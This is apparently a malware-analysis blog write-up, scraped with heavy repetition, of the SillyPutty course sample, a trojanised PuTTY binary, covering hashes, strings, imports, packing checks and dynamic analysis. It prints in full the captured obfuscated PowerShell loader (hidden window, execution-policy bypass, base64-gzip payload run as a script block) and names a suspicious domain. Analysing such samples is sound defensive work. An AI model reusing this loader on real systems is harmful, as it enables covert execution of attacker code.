hash to VirusTotal?Yes there is, as you can see on the screenshot below. (The VirusTotal result can be found here) I can see the file is flagged as malicious. However, I won‚Äôt dwell on VirusTotal. The aim here is to find the information by myself, as if the sample was still unknown. 4) Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?To pull the strings out of this binary, I used FLOSS with the command floss putty.exe \u003e output-floss.txt. From what I can see, the majority of the strings belong to the original PuTTY binary. Thus, it is difficult to spot any interesting strings. Supposition : the malicious actor has probably hidden some malicious code or a backdoor into the legitimate binary. This way, it is more difficult for a malware analyst to spot it quickly. 5) Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?To inspect the Import Address Table (IAT), I can again use PEStudio. Clicking on the imports section allows us to check the imported functions. As I said in the previous answer, the binary correspond to the legitime PuTTY binary with probably a backdoor in it. Thus, the inspection of the IAT doesn‚Äôt reveal anything interesting. However, from my perspective as a junior analyst, it‚Äôs quite appealing to import functions to add, delete and enumerate registry keys, even if in this case it‚Äôs legitimate. There is also functions like GetClipboardData and ShellExecuteA that are being imported. But those can also be legitimate for the regular usage of PuTTY. 6) Is it likely that this binary is packed?It doesn‚Äôt seem to be packed at first sight as I can read the IAT completely. But, I can verify it is not packed by comparing Virtual Size and Size of Raw Data of putty.exe. To do so, I have to open our binary in PEView. Then, by clicking on IMAGE_SECTION_HEADER .text, I can see the values I need. Size (in Hex) Size (in Dec) Virtual Size 00095F6D 614253 Size of Raw Data 00096000 614400 Size Difference 00000093 147 As I can see, the difference between the two is almost null. Since the size are almost equal, it means that thsi binary doesn‚Äôt seem to be packed. ","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:2:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#1-what-is-the-sha256-hash-of-the-sample"},{"categories":["Article"],"content":" Questions 1) What is the SHA256 hash of the sample?To find the SHA256 of the sample putty.exe, I used sha256sum.exe already available on FlareVM. I also calculated the MD5 with md5sum.exe. SHA256: 0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83 MD5: 334a10500feb0f3444bf2e86ab2e76da 2) What architecture is this binary?To get the architecture of putty.exe, I used PEStudio. Then, by clicking on the root directory, the architecture information will be available. As I can see, the architecture is 32-bit. 3) Are there any results from submitting the SHA256 hash to VirusTotal?Yes there is, as you can see on the screenshot below. (The VirusTotal result can be found here) I can see the file is flagged as malicious. However, I won‚Äôt dwell on VirusTotal. The aim here is to find the information by myself, as if the sample was still unknown. 4) Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?To pull the strings out of this binary, I used FLOSS with the command floss putty.exe \u003e output-floss.txt. From what I can see, the majority of the strings belong to the original PuTTY binary. Thus, it is difficult to spot any interesting strings. Supposition : the malicious actor has probably hidden some malicious code or a backdoor into the legitimate binary. This way, it is more difficult for a malware analyst to spot it quickly. 5) Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?To inspect the Import Address Table (IAT), I can again use PEStudio. Clicking on the imports section allows us to check the imported functions. As I said in the previous answer, the binary correspond to the legitime PuTTY binary with probably a backdoor in it. Thus, the inspection of the IAT doesn‚Äôt reveal anything interesting. However, from my perspective as a junior analyst, it‚Äôs quite appealing to import functions to add, delete and enumerate registry keys, even if in this case it‚Äôs legitimate. There is also functions like GetClipboardData and ShellExecuteA that are being imported. But those can also be legitimate for the regular usage of PuTTY. 6) Is it likely that this binary is packed?It doesn‚Äôt seem to be packed at first sight as I can read the IAT completely. But, I can verify it is not packed by comparing Virtual Size and Size of Raw Data of putty.exe. To do so, I have to open our binary in PEView. Then, by clicking on IMAGE_SECTION_HEADER .text, I can see the values I need. Size (in Hex) Size (in Dec) Virtual Size 00095F6D 614253 Size of Raw Data 00096000 614400 Size Difference 00000093 147 As I can see, the difference between the two is almost null. Since the size are almost equal, it means that thsi binary doesn‚Äôt seem to be packed. ","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:2:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#2-what-architecture-is-this-binary"},{"categories":["Article"],"content":" Questions 1) What is the SHA256 hash of the sample?To find the SHA256 of the sample putty.exe, I used sha256sum.exe already available on FlareVM. I also calculated the MD5 with md5sum.exe. SHA256: 0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83 MD5: 334a10500feb0f3444bf2e86ab2e76da 2) What architecture is this binary?To get the architecture of putty.exe, I used PEStudio. Then, by clicking on the root directory, the architecture information will be available. As I can see, the architecture is 32-bit. 3) Are there any results from submitting the SHA256 hash to VirusTotal?Yes there is, as you can see on the screenshot below. (The VirusTotal result can be found here) I can see the file is flagged as malicious. However, I won‚Äôt dwell on VirusTotal. The aim here is to find the information by myself, as if the sample was still unknown. 4) Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?To pull the strings out of this binary, I used FLOSS with the command floss putty.exe \u003e output-floss.txt. From what I can see, the majority of the strings belong to the original PuTTY binary. Thus, it is difficult to spot any interesting strings. Supposition : the malicious actor has probably hidden some malicious code or a backdoor into the legitimate binary. This way, it is more difficult for a malware analyst to spot it quickly. 5) Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?To inspect the Import Address Table (IAT), I can again use PEStudio. Clicking on the imports section allows us to check the imported functions. As I said in the previous answer, the binary correspond to the legitime PuTTY binary with probably a backdoor in it. Thus, the inspection of the IAT doesn‚Äôt reveal anything interesting. However, from my perspective as a junior analyst, it‚Äôs quite appealing to import functions to add, delete and enumerate registry keys, even if in this case it‚Äôs legitimate. There is also functions like GetClipboardData and ShellExecuteA that are being imported. But those can also be legitimate for the regular usage of PuTTY. 6) Is it likely that this binary is packed?It doesn‚Äôt seem to be packed at first sight as I can read the IAT completely. But, I can verify it is not packed by comparing Virtual Size and Size of Raw Data of putty.exe. To do so, I have to open our binary in PEView. Then, by clicking on IMAGE_SECTION_HEADER .text, I can see the values I need. Size (in Hex) Size (in Dec) Virtual Size 00095F6D 614253 Size of Raw Data 00096000 614400 Size Difference 00000093 147 As I can see, the difference between the two is almost null. Since the size are almost equal, it means that thsi binary doesn‚Äôt seem to be packed. ","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:2:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#3-are-there-any-results-from-submitting-the-sha256-hash-to-virustotal"},{"categories":["Article"],"content":" Questions 1) What is the SHA256 hash of the sample?To find the SHA256 of the sample putty.exe, I used sha256sum.exe already available on FlareVM. I also calculated the MD5 with md5sum.exe. SHA256: 0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83 MD5: 334a10500feb0f3444bf2e86ab2e76da 2) What architecture is this binary?To get the architecture of putty.exe, I used PEStudio. Then, by clicking on the root directory, the architecture information will be available. As I can see, the architecture is 32-bit. 3) Are there any results from submitting the SHA256 hash to VirusTotal?Yes there is, as you can see on the screenshot below. (The VirusTotal result can be found here) I can see the file is flagged as malicious. However, I won‚Äôt dwell on VirusTotal. The aim here is to find the information by myself, as if the sample was still unknown. 4) Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?To pull the strings out of this binary, I used FLOSS with the command floss putty.exe \u003e output-floss.txt. From what I can see, the majority of the strings belong to the original PuTTY binary. Thus, it is difficult to spot any interesting strings. Supposition : the malicious actor has probably hidden some malicious code or a backdoor into the legitimate binary. This way, it is more difficult for a malware analyst to spot it quickly. 5) Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?To inspect the Import Address Table (IAT), I can again use PEStudio. Clicking on the imports section allows us to check the imported functions. As I said in the previous answer, the binary correspond to the legitime PuTTY binary with probably a backdoor in it. Thus, the inspection of the IAT doesn‚Äôt reveal anything interesting. However, from my perspective as a junior analyst, it‚Äôs quite appealing to import functions to add, delete and enumerate registry keys, even if in this case it‚Äôs legitimate. There is also functions like GetClipboardData and ShellExecuteA that are being imported. But those can also be legitimate for the regular usage of PuTTY. 6) Is it likely that this binary is packed?It doesn‚Äôt seem to be packed at first sight as I can read the IAT completely. But, I can verify it is not packed by comparing Virtual Size and Size of Raw Data of putty.exe. To do so, I have to open our binary in PEView. Then, by clicking on IMAGE_SECTION_HEADER .text, I can see the values I need. Size (in Hex) Size (in Dec) Virtual Size 00095F6D 614253 Size of Raw Data 00096000 614400 Size Difference 00000093 147 As I can see, the difference between the two is almost null. Since the size are almost equal, it means that thsi binary doesn‚Äôt seem to be packed. ","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:2:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#4-describe-the-results-of-pulling-the-strings-from-this-binary-record-and-describe-any-strings-that-are-potentially-interesting-can-any-interesting-information-be-extracted-from-the-strings"},{"categories":["Article"],"content":" Questions 1) What is the SHA256 hash of the sample?To find the SHA256 of the sample putty.exe, I used sha256sum.exe already available on FlareVM. I also calculated the MD5 with md5sum.exe. SHA256: 0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83 MD5: 334a10500feb0f3444bf2e86ab2e76da 2) What architecture is this binary?To get the architecture of putty.exe, I used PEStudio. Then, by clicking on the root directory, the architecture information will be available. As I can see, the architecture is 32-bit. 3) Are there any results from submitting the SHA256 hash to VirusTotal?Yes there is, as you can see on the screenshot below. (The VirusTotal result can be found here) I can see the file is flagged as malicious. However, I won‚Äôt dwell on VirusTotal. The aim here is to find the information by myself, as if the sample was still unknown. 4) Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?To pull the strings out of this binary, I used FLOSS with the command floss putty.exe \u003e output-floss.txt. From what I can see, the majority of the strings belong to the original PuTTY binary. Thus, it is difficult to spot any interesting strings. Supposition : the malicious actor has probably hidden some malicious code or a backdoor into the legitimate binary. This way, it is more difficult for a malware analyst to spot it quickly. 5) Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?To inspect the Import Address Table (IAT), I can again use PEStudio. Clicking on the imports section allows us to check the imported functions. As I said in the previous answer, the binary correspond to the legitime PuTTY binary with probably a backdoor in it. Thus, the inspection of the IAT doesn‚Äôt reveal anything interesting. However, from my perspective as a junior analyst, it‚Äôs quite appealing to import functions to add, delete and enumerate registry keys, even if in this case it‚Äôs legitimate. There is also functions like GetClipboardData and ShellExecuteA that are being imported. But those can also be legitimate for the regular usage of PuTTY. 6) Is it likely that this binary is packed?It doesn‚Äôt seem to be packed at first sight as I can read the IAT completely. But, I can verify it is not packed by comparing Virtual Size and Size of Raw Data of putty.exe. To do so, I have to open our binary in PEView. Then, by clicking on IMAGE_SECTION_HEADER .text, I can see the values I need. Size (in Hex) Size (in Dec) Virtual Size 00095F6D 614253 Size of Raw Data 00096000 614400 Size Difference 00000093 147 As I can see, the difference between the two is almost null. Since the size are almost equal, it means that thsi binary doesn‚Äôt seem to be packed. ","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:2:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#5-describe-the-results-of-inspecting-the-iat-for-this-binary-are-there-any-imports-worth-noting"},{"categories":["Article"],"content":" Questions 1) What is the SHA256 hash of the sample?To find the SHA256 of the sample putty.exe, I used sha256sum.exe already available on FlareVM. I also calculated the MD5 with md5sum.exe. SHA256: 0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83 MD5: 334a10500feb0f3444bf2e86ab2e76da 2) What architecture is this binary?To get the architecture of putty.exe, I used PEStudio. Then, by clicking on the root directory, the architecture information will be available. As I can see, the architecture is 32-bit. 3) Are there any results from submitting the SHA256 hash to VirusTotal?Yes there is, as you can see on the screenshot below. (The VirusTotal result can be found here) I can see the file is flagged as malicious. However, I won‚Äôt dwell on VirusTotal. The aim here is to find the information by myself, as if the sample was still unknown. 4) Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?To pull the strings out of this binary, I used FLOSS with the command floss putty.exe \u003e output-floss.txt. From what I can see, the majority of the strings belong to the original PuTTY binary. Thus, it is difficult to spot any interesting strings. Supposition : the malicious actor has probably hidden some malicious code or a backdoor into the legitimate binary. This way, it is more difficult for a malware analyst to spot it quickly. 5) Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?To inspect the Import Address Table (IAT), I can again use PEStudio. Clicking on the imports section allows us to check the imported functions. As I said in the previous answer, the binary correspond to the legitime PuTTY binary with probably a backdoor in it. Thus, the inspection of the IAT doesn‚Äôt reveal anything interesting. However, from my perspective as a junior analyst, it‚Äôs quite appealing to import functions to add, delete and enumerate registry keys, even if in this case it‚Äôs legitimate. There is also functions like GetClipboardData and ShellExecuteA that are being imported. But those can also be legitimate for the regular usage of PuTTY. 6) Is it likely that this binary is packed?It doesn‚Äôt seem to be packed at first sight as I can read the IAT completely. But, I can verify it is not packed by comparing Virtual Size and Size of Raw Data of putty.exe. To do so, I have to open our binary in PEView. Then, by clicking on IMAGE_SECTION_HEADER .text, I can see the values I need. Size (in Hex) Size (in Dec) Virtual Size 00095F6D 614253 Size of Raw Data 00096000 614400 Size Difference 00000093 147 As I can see, the difference between the two is almost null. Since the size are almost equal, it means that thsi binary doesn‚Äôt seem to be packed. ","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:2:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#6-is-it-likely-that-this-binary-is-packed"},{"categories":["Article"],"content":" Basic Dynamic Analysis","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:3:0","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#basic-dynamic-analysis"},{"categories":["Article"],"content":" Tools Wireshark Inetsim Netcat TCPView Procmon ","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:3:1","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#tools-1"},{"categories":["Article"],"content":" Questions 1) Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?During the first detonation, I can see a blue terminal prompt popping briefly on the screen. It seems to be a PowerShell command prompt. At the same time, the PuTTY GUI opens. There doesn‚Äôt seem to be any differences between a detonation with and without internet simulation. During my test, I launched Wireshark and found an interesting DNS request to the following domain : bonus2.corporatebonusapplication.local. I can notice there is also some TCP RST packets. I don‚Äôt really know what to do with that information but I thought it would be great to keep it in case of. 2) From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?In order to get the main payload that is initiated at detonation, I decided to use ProcMon. First, I launched it and created two filters : Process Name contains putty.exe Details contains Command Then, I executed the malicious binary. As expected, I got some interesting results appearing. I noticed that Powershell was called with the PID 5820. I expanded the Detail section in order to get more informations about what is being executed. Date: 11/11/2023 6:19:21.9411828 PM Thread: 5008 Class: Process Operation: Process Create Result: SUCCESS Path: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe Duration: 0.0000000 PID: 5820 Command line: powershell.exe -nop -w hidden -noni -ep bypass \"\u0026([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\" I can see this is a Powershell command with differents options. Let‚Äôs detail each one of them. -nop : Equivalent for -NoProfile. Allows to NOT load the Windows Powershell profile. A PowerShell profile is a script that runs when PowerShell is started to customize your environment. Since it‚Äôs not needed to execute a malicious payload, it‚Äôs better for an attacker to bypass it and avoid any scripts that could prevent its execution. -w hidden : Equivalent for -WindowStyle. Allows to hide the window when executing the command (but this shows a window for a while, which is why we‚Äôre seeing a blue powershell window briefly while detonating the malware). -noni : Equivalent for -NonInteractive. Allows to NOT display an interactive interface for the user. -ep bypass : Equivalent for -ExecutionPolicy. Allows to bypass the execution policy. In this case, it is necessary to execute the payloa","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:3:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#questions-1"},{"categories":["Article"],"content":" Questions 1) Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?During the first detonation, I can see a blue terminal prompt popping briefly on the screen. It seems to be a PowerShell command prompt. At the same time, the PuTTY GUI opens. There doesn‚Äôt seem to be any differences between a detonation with and without internet simulation. During my test, I launched Wireshark and found an interesting DNS request to the following domain : bonus2.corporatebonusapplication.local. I can notice there is also some TCP RST packets. I don‚Äôt really know what to do with that information but I thought it would be great to keep it in case of. 2) From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?In order to get the main payload that is initiated at detonation, I decided to use ProcMon. First, I launched it and created two filters : Process Name contains putty.exe Details contains Command Then, I executed the malicious binary. As expected, I got some interesting results appearing. I noticed that Powershell was called with the PID 5820. I expanded the Detail section in order to get more informations about what is being executed. Date: 11/11/2023 6:19:21.9411828 PM Thread: 5008 Class: Process Operation: Process Create Result: SUCCESS Path: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe Duration: 0.0000000 PID: 5820 Command line: powershell.exe -nop -w hidden -noni -ep bypass \"\u0026([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\" I can see this is a Powershell command with differents options. Let‚Äôs detail each one of them. -nop : Equivalent for -NoProfile. Allows to NOT load the Windows Powershell profile. A PowerShell profile is a script that runs when PowerShell is started to customize your environment. Since it‚Äôs not needed to execute a malicious payload, it‚Äôs better for an attacker to bypass it and avoid any scripts that could prevent its execution. -w hidden : Equivalent for -WindowStyle. Allows to hide the window when executing the command (but this shows a window for a while, which is why we‚Äôre seeing a blue powershell window briefly while detonating the malware). -noni : Equivalent for -NonInteractive. Allows to NOT display an interactive interface for the user. -ep bypass : Equivalent for -ExecutionPolicy. Allows to bypass the execution policy. In this case, it is necessary to execute the payloa","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:3:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#1-describe-initial-detonation-are-there-any-notable-occurrences-at-first-detonation-without-internet-simulation-with-internet-simulation"},{"categories":["Article"],"content":" Questions 1) Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?During the first detonation, I can see a blue terminal prompt popping briefly on the screen. It seems to be a PowerShell command prompt. At the same time, the PuTTY GUI opens. There doesn‚Äôt seem to be any differences between a detonation with and without internet simulation. During my test, I launched Wireshark and found an interesting DNS request to the following domain : bonus2.corporatebonusapplication.local. I can notice there is also some TCP RST packets. I don‚Äôt really know what to do with that information but I thought it would be great to keep it in case of. 2) From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?In order to get the main payload that is initiated at detonation, I decided to use ProcMon. First, I launched it and created two filters : Process Name contains putty.exe Details contains Command Then, I executed the malicious binary. As expected, I got some interesting results appearing. I noticed that Powershell was called with the PID 5820. I expanded the Detail section in order to get more informations about what is being executed. Date: 11/11/2023 6:19:21.9411828 PM Thread: 5008 Class: Process Operation: Process Create Result: SUCCESS Path: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe Duration: 0.0000000 PID: 5820 Command line: powershell.exe -nop -w hidden -noni -ep bypass \"\u0026([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))\" I can see this is a Powershell command with differents options. Let‚Äôs detail each one of them. -nop : Equivalent for -NoProfile. Allows to NOT load the Windows Powershell profile. A PowerShell profile is a script that runs when PowerShell is started to customize your environment. Since it‚Äôs not needed to execute a malicious payload, it‚Äôs better for an attacker to bypass it and avoid any scripts that could prevent its execution. -w hidden : Equivalent for -WindowStyle. Allows to hide the window when executing the command (but this shows a window for a while, which is why we‚Äôre seeing a blue powershell window briefly while detonating the malware). -noni : Equivalent for -NonInteractive. Allows to NOT display an interactive interface for the user. -ep bypass : Equivalent for -ExecutionPolicy. Allows to bypass the execution policy. In this case, it is necessary to execute the payloa","date":"2023-11-09","objectID":"/malware-analysis-sillyputty/:3:2","series":null,"tags":["Malware","PMAT","IAT","Wireshark","Procmon","Powershell"],"title":"Malware Analysis : SillyPutty","uri":"/malware-analysis-sillyputty/#2-from-the-host-based-indicators-perspective-what-is-the-main-payload-that-is-initiated-at-detonation-what-tool-can-you-use-to-identify-this"},{"categories":["Article"],"content":" Questions 1) Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?During the first detonation, I can see a blue terminal prompt popping briefly on the screen. It seems to be a PowerShell command prompt. At the same time, the PuTTY GUI opens. There doesn‚Äôt seem to be any differences between a detonation with and without internet simulation. During my test, I launched Wireshark and found an interesting DNS request to the following domain : bonus2.corporatebonusapplication.local. I can notice there is also some TCP RST packets. I don‚Äôt really know what to do with that information but I thought it would be great to keep it in case of. 2) From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?In order to get the main payload that is initiated at detonation, I decided to use ProcMon. First, I launched it and created two filters : Process Name contains putty.exe Details contains Command Then, I executed the malicious binary. As expected, I got some interesting results appearing. I noticed that Powershell was called with the PID 5820. I expanded the Detail section in order to get more informations about what is being executed. Date: 11/11/2023 6:19:21.9411828 PM Thread: 5008 Class: Process Operation: Process Create Result: SUCCESS Path: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe Duration: 0.0000000 PID: 5820 Command line: powershell.exe -nop -w hidden -noni -ep bypass \"\u0026([scriptblock]::create((New-Object 